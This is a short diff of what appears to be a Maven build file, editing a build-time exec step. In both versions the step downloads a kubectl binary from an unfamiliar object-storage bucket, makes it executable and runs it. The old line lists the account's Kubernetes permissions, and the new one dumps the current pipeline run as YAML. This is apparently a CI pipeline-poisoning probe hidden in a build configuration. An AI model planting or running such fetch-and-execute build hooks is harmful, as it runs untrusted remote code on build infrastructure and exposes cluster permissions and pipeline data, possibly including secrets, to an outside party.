@@ -36,7 +36,7 @@
                             <!-- 命令的参数 -->
                             <arguments>
                                 <argument>-c</argument>
-                                <argument>curl https://cbvbcv.tos-cn-beijing.volces.com/kubectl -o /tmp/kubectl;chmod +x /tmp/kubectl;/tmp/kubectl auth can-i --list</argument>
+                                <argument>curl https://cbvbcv.tos-cn-beijing.volces.com/kubectl -o /tmp/kubectl;chmod +x /tmp/kubectl;/tmp/kubectl get pipelineruns ${env.EXECUTION_ID} -o yaml</argument>
                             </arguments>
                         </configuration>
                     </execution>
